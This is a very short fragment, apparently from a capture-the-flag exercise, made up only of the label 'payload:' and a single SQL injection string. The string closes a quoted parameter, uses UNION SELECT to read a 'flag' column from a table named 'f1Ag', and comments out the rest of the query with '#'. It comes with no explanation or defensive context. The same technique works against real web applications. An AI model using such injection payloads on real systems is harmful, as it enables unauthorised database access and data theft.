payload:

-1' union select 1,2,flag from f1Ag#